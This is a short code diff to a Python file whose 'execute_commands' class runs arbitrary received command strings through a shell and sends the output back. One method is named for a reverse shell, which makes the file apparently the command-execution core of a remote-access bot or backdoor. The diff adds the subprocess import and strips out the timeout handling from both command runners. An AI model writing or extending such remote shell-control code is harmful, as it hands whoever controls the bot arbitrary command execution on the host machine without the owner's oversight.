@@ -14,7 +14,7 @@ import time
 import zipfile
 import os
 import random
-
+import subprocess
 import schedule
 
 from typing import List
@@ -117,11 +117,7 @@ class execute_commands:
         return output
 
     def runcommand(self):
-        try:
-            result = subprocess.check_output(self.command, shell=True, timeout=self.timeout)
-        except TimeoutExpired:
-            result = "TimeOut!"
-
+        result = subprocess.check_output(self.command, shell=True)
         self.send_message(f"""RE: {self.command}
         Results: {self.clean_shell_data(result)}""")
         return 0
@@ -129,11 +125,7 @@ class execute_commands:
 
     def runcommand_for_reverse_shell(self):
         # Is shell ?
-        try:
-            result = subprocess.check_output(self.command, shell=True)
-        except TimeoutExpired:
-            result = "TimeOut!"
-
+        result = subprocess.check_output(self.command, shell=True)
         return result
 
 
